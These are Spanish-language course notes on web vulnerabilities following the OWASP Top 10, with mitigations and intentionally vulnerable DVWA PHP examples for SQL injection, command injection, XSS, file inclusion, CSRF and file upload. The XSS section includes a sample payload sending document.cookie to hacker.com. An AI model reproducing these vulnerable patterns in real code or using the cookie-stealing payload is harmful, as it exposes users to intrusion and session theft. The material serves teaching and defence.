# Tema 3: Vulnerabilidades web

## 1. Introducción

- **Vulnerabilidad web**: fallo de seguridad en:
    - Una aplicación web hecha a medida
    - La arquitectura
    - El diseño
    - La configuración
    - El mismo código
- **Especial importancia** debido al uso extendido de aplicaciones web
    - Aplicaciones populares comparten vulnerabilidades:
        - **HTTP no fue diseñado para ser seguro**
            - Pero es necesario proveer a usuarios externos de contenido alojado internamente

## 2. OWASP

- *Open Web Application Security Project*
- Proyecto de código abierto dedicado a determinar y combatir las causas que hacen que el software web sea inseguro
- *Conjunto de proyectos* → documenta o aportan herramientas seguridad en aplicaciones web
    - **Guía OWASP**: Enorme documento que proporciona una guía detallada de seguridad de aplicaciones web
    - **OWASP Top 10**
    - **Métricas**: Proyecto para definir métricas aplicables a la seguridad.
    - **Guía de pruebas**

### OWASP Top 10

- Lista las **vulnerabilidades web más comunes** y calcula **su riesgo** dependiendo de un conjunto de factores:
    - **Facilidad** de emplear el vector **de ataque**
    - **Predominio**
    - **Facilidad de detección**
    - **Impacto** técnico sobre la empresa u organización

#### Listado (2013)

- Inyección
- Ejecución maliciosa de ficheros
- XSS
- Mala autenticación y gestión de sesiones
- Referencia directa insegura a objetos
- CSRF
- Configuraciones Inseguras
- URL mal restringidas
- Redirecciones y reenvíos
- Almacenamiento criptográfico inseguro
- Protección insuficiente en la capa de transporte

## 3. Inyección :red_circle:

- **Manipular las entradas** de una aplicación **para mandar comandos** a algún interprete para que los ejecute
    - **SQL**, Shell del SO, LDAP, XPath, Hibernate, etc.
- **Falta de saneamiento de entradas**
- **Sencillo de evitar**
- Tiene un **impacto severo**
    - Acceso a bases de datos
    - Acceso a SO
- **Mitigación**:
    - Evitar utilizar un intérprete
    - Escapar caracteres
    - Delimitar los valores de las consultas
    - **Verificar siempre los datos** que introduce el usuario
    - Asignar **mínimos privilegios**

### SQL Injection

#### Low

```php
<?php
    if isset($_GET['Submit'])){
         
        $id = $_GET['id'];

        $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
        $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

        $num = mysql_numrows($result);

        $i = 0;

        while ($i < $num) {

            $first = mysql_result($result,$i,"first_name");
            $last = mysql_result($result,$i,"last_name");
            
            echo '<pre>';
            echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
            echo '</pre>';

            $i++;
        }
    }
?>
```

#### Medium

```php
<?php
    if (isset($_GET['Submit'])) {

        $id = $_GET['id'];
        $id = mysql_real_escape_string($id);

        $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";

        $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );
        
        $num = mysql_numrows($result);

        $i=0;

        while ($i < $num) {

            $first = mysql_result($result,$i,"first_name");
            $last = mysql_result($result,$i,"last_name");
            
            echo '<pre>';
            echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
            echo '</pre>';

            $i++;
        }
    }
?>
```

### Command Injection

#### Low

```php
<?php
    if (isset( $_POST['submit'])) {

        $target = $_REQUEST['ip'];

        if (stristr(php_uname('s'), 'Windows NT')) { 
            $cmd = shell_exec('ping  ' . $target);
            echo '<pre>' . $cmd . '</pre>';
        } else {     
            $cmd = shell_exec('ping  -c 3 ' . $target);
            echo '<pre>' . $cmd . '</pre>';
        }
    }
?>
```

#### Medium

```php
<?php
    if (isset($_POST['submit'])) {

        $target = $_REQUEST['ip'];

        $substitutions = array(
            '&&' => '',
            ';' => '',
        );

        $target = str_replace(array_keys($substitutions), $substitutions, $target);
        
        if (stristr(php_uname('s'), 'Windows NT')) { 
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>' . $cmd . '</pre>';
        } else { 
            $cmd = shell_exec('ping  -c 3 ' . $target);
            echo '<pre>' . $cmd . '</pre>';
        }
    }
?>
```

## 4. Cross Site Scripting (XSS) :red_circle:

- Un atacante manda un trozo de código (vector de ataque) al navegador de la víctima aprovechando un fallo en una aplicación web
- Sucede **cuando la aplicación no valida la entrada**
- Robar sesiones, defacing, introducir malware, ...
- Formas de sofisticación:
    - **Esconder** el vector de ataque en **tags HTML** (iframes, imágenes, ...)
    - **Codificar** el vector (Unicode)
- Tipos de XSS
    - Persistente (XSS Stored)
        - El código introducido se almacena de manera permanente (BD, ...)
    - No persistente (XSS Reflected)
        - Los ataques llegan a la víctima a través de otro ruta (un email, modificación directa de parámetros en la URL…)
    - Inyección en DOM
        - El código inyectado manipula el código JS or variables de la aplicación en vez de los objetos HTML
    - Ejemplo:

```text
Comentario="¡Me encanta la web! <script>
window.open(http://hacker.com/info.pl?document.cookie)</script>
```

- **Mitigación**:
    - **Eliminar los fallos** o evitar incluir aplicaciones propensas a XSS
    - **Filtrar las salidas** convirtiéndolas a un formato codificado:
        - `<` y `>` -> `&lt;` y `&gt;`
        - `(` y `)` -> `&#40;` y `&#41;`
        - `#` y `&` -> `&#35;` y `&#38;`
    - Utilizar **validación de entrada** mediante whitelists
    - API AntiSamy de OSWAP (sanear las entrada)

### XSS reflected

#### Low

```php
<?php
    if (!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '') {
        $isempty = true;
    } else {
        echo '<pre>';
        echo 'Hello ' . $_GET['name'];
        echo '</pre>';
    }
?>
```

#### Medium

```php
<?php
    if (!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
        $isempty = true;
    } else {
        echo '<pre>';
        echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
        echo '</pre>'; 
    }
?>
```

### XSS stored

#### Low

```php
<?php
    if(isset($_POST['btnSign'])) {

        $message = trim($_POST['mtxMessage']);
        $name    = trim($_POST['txtName']);

        $message = stripslashes($message);
        $message = mysql_real_escape_string($message);

        $name = mysql_real_escape_string($name);

        $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";

        $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
    }
?>
```

#### Medium

```php
<?php
    if(isset($_POST['btnSign'])) {

        $message = trim($_POST['mtxMessage']);
        $name    = trim($_POST['txtName']);

        $message = trim(strip_tags(addslashes($message)));
        $message = mysql_real_escape_string($message);
        $message = htmlspecialchars($message);

        $name = str_replace('<script>', '', $name);
        $name = mysql_real_escape_string($name);

        $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";

        $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' ); 
    }
?>
```

## 5. Ejecución de código (Command Injection)

- Permite la ejecución de código remota "arbitraria"
- Ejemplo: **Shellshock** ([CVE-2014-6271](<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271>))
    - El bug se encuentra en Bash (< v4.3)
    - Bash permite declarar funciones que no se validan de forma correcta cuando se almacenan en una variable
    - Sigue ejecutando código a pesar de finalizar el procesamiento de la función

### Command Execution

#### Low

```php
<?php
    if( isset( $_POST[ 'submit' ] ) ) {

        $target = $_REQUEST[ 'ip' ];

        if (stristr(php_uname('s'), 'Windows NT')) { 
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        } else { 
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';  
        }
    }
?>
```

#### Medium

```php
<?php
    if (isset($_POST[ 'submit'])) {

        $target = $_REQUEST[ 'ip' ];

        $substitutions = array(
            '&&' => '',
            ';' => '',
        );

        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
        
        if (stristr(php_uname('s'), 'Windows NT')) { 
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';
        } else { 
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';  
        }
    }
?>
```

## 6. Ejecución maliciosa de ficheros (LFI/RFI)

- **No** está en el ranking top 10 de OWASP
- *Dos tipos*:
    - **Local File Inclusion (LFI)**
    - **Remote File Inclusion (RFI)**
- Permite a un atacante:
    - Introducir código ejecutable
    - Acceder a datos privados como logs, contraseñas, información de sesión, ...
- **Mitigación**:
    - **No incluir rutas a ficheros** en la URL
    - Whitelist
    - Cuidado con formularios que permitan subida de ficheros
    - Almacenar ficheros en una ruta distinta de la raíz
    - **Validar la ruta y extensión del fichero**
    - Implementar un sistema de sandbox o chroot que limite el acceso

### File Inclusion

#### Low

```php
<?php
    $file = $_GET['page'];
?>
```

#### Medium

```php
<?php
    $file = $_GET['page'];
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file);        
?>
```

## 7. Mala autenticación y gestión de sesiones (Session Hijacking)

- Credenciales y tokens de sesión no bien protegidos
- Los atacantes pueden obtener contraseñas, claves o tokens → Robo de sesión
- HTTP/S no tiene estado
    - El identificador de sesión se incluye en cada petición
    - En muchos casos es visible en:
        - La red, en el navegador (Live HTTP Headers), logs, ...
- Los frameworks ofrecen sistemas de gestión de sesiones
    - Crear sistemas de gestión de sesiones propio puede ser peligroso.

### Gestión de sesiones (Session Hijacking)

- Una **ID de sesión** tiene que ser:
    - **Único** a cada usuario
    - Válido únicamente para **una sesión**
    - **Generado por el servidor**
    - Enviado al cliente como:
        - Una variable oculta
        - Una cookie HTTP (http only)
- El robo de sesión (**Session Hijacking**) puede producirse cuando:
    - El ID de sesión **se puede adivinar, deducir u obtener**
    - Generalmente la ID de sesión del atacante suele tener los mismos privilegios que el usuario al que se usurpa la identidad
    - útil cuando la sesión que se roba tiene privilegios
    - Utilizado para escalar privilegios o iniciar nuevos vectores de ataque
**Mitigación**:
    - **ID** de sesión **compleja y ALEATORIA**
    - **Protección en la transmisión y almacenaje** de la ID de sesión
    - **No incluir** el identificador de la sesión **en la URL**:
        - Asi se guarda en la caché del navegador
        - Así se guarda en cualquier proxy intermedio
        - Facilita al atacante la labor de manipularlo
    - **Utilizar HTTPS** en toda la sesión
    - Evitar o proteger cualquier información que se trasmita desde o al cliente
    - El identificador de sesión **debe caducar**
        - **Regenerar el identificador de la sesión**
        - Cookies en el lado del cliente: fecha de expiración

### Gestión de autenticación

- Puede dañar la seguridad:
    - Formularios para el cambio de contraseña
    - Formularios para contraseñas olvidadas
    - Políticas de contraseña
    - Periodo de validez de contraseña
    - Almacenar contraseñas de manera segura
    - Proteger la comunicación
    - Informar a los usuarios sobre los riesgos y consecuencias de aceptar conexiones inseguras

## 8. Referencia directa insegura a objetos

- Referencias a objetos implementados de manera interna
- Los atacantes pueden manipular estas referencias para acceder a otros objetos sin autorización
    - Lo típico de **modificar parámetros en una URL para ver si devuelve recursos** que no debería devolver
- Elementos que pueden ser vulnerables:
    - Ficheros o directorios
    - URL
    - Clave de BD, nombres de tablas, etc.
- **Mitigación**
    - Eliminar la referencia al objeto
    - Sustituirla por un valor temporal de referencia
        - `http://aplicacion?fichero=imagen1.jpg` → `http://aplicacion?fichero=1`
        - Mapa de referencia
    - **Validar la referencia directa**
        - Verificar que el valor es correcto
        - **Verificar si el usuario tiene permiso** para acceder al objeto

## 9. Cross Site Request Forgery (CSRF) :red_circle:

- **Forzar** a la víctima a:
    - **Realizar una petición** HTTP a una aplicación web vulnerable
        - **A la que ya se autenticó**
        - Aprovecha cookies de sesión e info que ya esta en el navegador
        - Para la aplicación vulnerable, es el usuario quien accede
- **¿Como forzar?**
    - Inyectando script con URL maliciosa desde otra web
    - Para que cuando el usuario acceda se lo descargue y lo ejecute
- CSRF **es tan potente como la aplicación web que se ataca**
- Puede ser vulnerable a CSRF si:
    - **No verifica** la autenticación
    - La autenticación por defecto permite realizar operaciones
    - **Se autorizan operaciones** basándose únicamente en las **credenciales del navegador** (Cookie de sesión, token Kerberos, autenticación clásica, certificado SSL, ...)
- **Mitigación**:
    - **Token secreto a todas las peticiones**
        - Evitando falsificar la petición (a menos que exista vulnerabilidad XSS)
        - Robusto y aleatorio
        - Añadirlo a todos los formularios y enlaces
    - **No incluir** el token **en las cabeceras de referencia**
    - **No permitir** a los atacantes **guardar vectores de ataque** en la aplicación:
        - Codificar todas las entradas en la salida
        - Evitar que todos los enlaces y las peticiones se ejecuten

### CSRF

#### Low

```php
<?php            
    if (isset($_GET['Change'])) {

        $pass_new = $_GET['password_new'];
        $pass_conf = $_GET['password_conf'];

        if (($pass_new == $pass_conf)) {
            $pass_new = mysql_real_escape_string($pass_new);
            $pass_new = md5($pass_new);

            $insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
                        
            echo "<pre> Password Changed </pre>";        
            mysql_close();
        }
        else {        
            echo "<pre> Passwords did not match. </pre>";            
        }
    }
?>
```

#### Medium

```php
<?php 
    if (isset($_GET['Change'])) {
        // Checks the http referer header
        if (eregi("127.0.0.1", $_SERVER['HTTP_REFERER'])) {

            // Turn requests into variables
            $pass_new = $_GET['password_new'];
            $pass_conf = $_GET['password_conf'];

            if ($pass_new == $pass_conf) {
                $pass_new = mysql_real_escape_string($pass_new);
                $pass_new = md5($pass_new);

                $insert="UPDATE `users` SET password = '$pass_new' WHERE user = 'admin';";
                $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
                        
                echo "<pre> Password Changed </pre>";        
                mysql_close();
            }
            else {
                echo "<pre> Passwords did not match. </pre>";            
            }    
        }
    }
?>
```

## 10. Configuraciones inseguras

- De todo tipo:
    - En equipos de producción y de desarrollo
    - Consecuencias diversas: (Revelar directorios, datos de conexión, credenciales, Modificación de ficheros, ...)
        - **Backdoors**
        - Explotación de XSS debido a faltas de parches de seguridad en frameworks
        - Acceso no autorizado a **cuentas por defecto**
            - Código fuente
                - ¿Es privado?: ¿dónde se guarda?, ¿está a salvo?
        - Cambio de credenciales **al migrar** los sistemas **de desarrollo a producción**
- **Mitigacion**:
    - **Verificar configuraciones** de todas las **aplicaciones y servicios**
        - Automatización
        - Guías de "Hardening"
    - **Actualizaciones** de seguridad
        - Bibliotecas, SO, aplicaciones
    - Analizar los cambios.
    - Generar reportes para poder analizar posteriormente
    - Software de **análisis de vulnerabilidades**, configuración y parches

## 11. URLs mal restringidas

- Relacionado con fallos en:
    - Gestión de autenticación
    - Referencias directas inseguras a objetos
    - Malas configuraciones de seguridad
- **Acceso a enlaces que no estén indizados**
    - Ejemplo: No quitar `phpinfo.php`
- Formas de explotación:
    - Invocar funciones o servicios privilegiados
    - **Acceso no autorizado** a datos/cuentas de otros usuarios
    - Realizar **operaciones privilegiadas** o escalar privilegios
    - Revelación de **datos sensibles**
- **Mitigación**
    - Asegurar tres cosas:
        - **Acceso restringido** a usuarios autorizados
        - **Gestionar permisos** basados en usuario o grupo
        - **Bloquear** todo tipo de peticiones a **páginas no autorizadas**
- Verificar el control de acceso en cada capa de la arquitectura
- Verificar que el **servidor deniega peticiones** a tipos de fichero no autorizados por defecto
- Escaneos rutinarios

## 12. Redirecciones y reenvíos

- **Mala validación de los parámetros**
    - Páginas de Phishing, por ejemplo, una página de login falsa
    - Páginas de malware (Instalación de toolbars, ...)
    - Exploits para navegador
- Ingeniería social para conseguir que la víctima abra el enlace
    - Envío del enlace por email, en foros, chats, ...
    - La URL corresponde con la página oficial
- **Mitigación**:
    - **Evitar utilizar redirecciones** y reenvíos en la medida de lo posible
        - Evitar incluir la redirección como parámetro en la URL
        - **Incluir un parámetro** en la URL:
            - Validar cada parámetro
            - Mapear las redirecciones en el lado del servidor (`?redir=2 → redirección.php`)
    - **Validar la URL siempre**
        - Esto se puede conseguir mediante **ESAPI**
    - Validar la redirección mediante un filtro externo como Siteminder
    - Comprobar que el usuario tenga permisos para ver ambas páginas

## 13. Subida de archivos sin restricción

1. Conseguir **colar algún código en el sistema** a atacar
2. Encontrar una manera de ejecutar ese código

- Las consecuencias son diversas
    - Dependen de lo que haga el código contenido en el archivo
- **Mitigación**:
    - **Comprobar las extensiones** y utilizar whitelists
    - **Filtrar los archivos** por tamaño
    - Comprobar el **nombre** de los archivos
    - **Sanear la entrada** de caracteres de los archivos (`:`, `>`, `<`, `/`, `\`)
    - **Limitar la carpeta** donde se almacenan los archivos:
        - Tamaño máximo
        - Mínimos permisos
    - Escanear periódicamente los archivos subidos para buscal malware

### Upload

#### Low

```php
<?php
    if (isset($_POST['Upload'])) {

        $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
        $target_path = $target_path . basename( $_FILES['uploaded']['name']);

        if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
            echo '<pre>';
            echo 'Your image was not uploaded.';
            echo '</pre>';
        } else {
            echo '<pre>';
            echo $target_path . ' succesfully uploaded!';
            echo '</pre>';
        }
    }
    ?>
```

#### Medium

```php
<?php
    if (isset($_POST['Upload'])) {

        $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
        $target_path = $target_path . basename($_FILES['uploaded']['name']);
        $uploaded_name = $_FILES['uploaded']['name'];
        $uploaded_type = $_FILES['uploaded']['type'];
        $uploaded_size = $_FILES['uploaded']['size'];

        if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){

            if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
                echo '<pre>';
                echo 'Your image was not uploaded.';
                echo '</pre>';
            } else {
                echo '<pre>';
                echo $target_path . ' succesfully uploaded!';
                echo '</pre>';
            }
        }
        else {
            echo '<pre>Your image was not uploaded.</pre>';
        }
    }
?>
```

## 14. Almacenamiento Criptográfico Inseguro

- Problemas relacionados con como se guarda la información
    - **No se guarda** la **información sensible cifrada**
        - Típicos logs que se quedan desprotegidos, ...
        - Los atacantes consiguen acceso no autorizado a cuentas, datos, etc.
    - **Fallos en la implementación** del cifrado:
        - **Almacenaje inseguro** o incorrecto de contraseñas, certificados, claves …
            - Ejemplo: Contraseñas en BASE64 en vez de cifradas
        - Uso de un **algoritmo inadecuado**
            - Ejemplo: MD5 para almacenar contraseñas
        - Utilizar una **semilla insuficientemente aleatoria** para vectores de inicialización
        - Intentar desarrollar un sistema de cifrado propio (mala idea)
- **Mitigación**:
    - **Verificar la arquitectura** de las aplicaciones
        - Identificar datos sensibles
        - Identificar los puntos donde se guardan
        - Identificar posibles riegos
    - **Utilizar el cifrado** para paliar los riesgos
        ▪ **Mecanismos de cifrado apropiados** a las circunstancias
        ▪ Utilizar de manera correcta
            - Algoritmos estándar
            - Generación, distribución y protección de claves apropiada
            - Cambios de clave
    - **Verificar la implementación**

## 15. Protección insuficiente en la capa de transporte

- **Transmitir datos importantes de manera segura**
    - Varios factores:
        - No identificar correctamente todos los datos importantes
        - No identificar todos los sitios a los que se envían los datos importantes
        - No proteger los datos de manera correcta en todos los puntos.
- La falta de seguridad en la capa de transporte **tiene un impacto diverso**:
    - Acceso no autorizado o modificación de información privada
    - Puede ser utilizada en otros ataques
- **Mitigación**:
    - Uso de mecanismos de comunicación segura:
        - TLS
        - **Cifrar mensajes** antes de transmitirlos
        - **Firma digital** de mensajes antes de transmitirlos
    - Uso apropiado de mecanismos de comunicación segura:
        - Algoritmos estándar y seguros
        - Almacenar y trasmitir certificados/claves de manera segura
        - Verificar los certificados SSL antes de utilizarlos
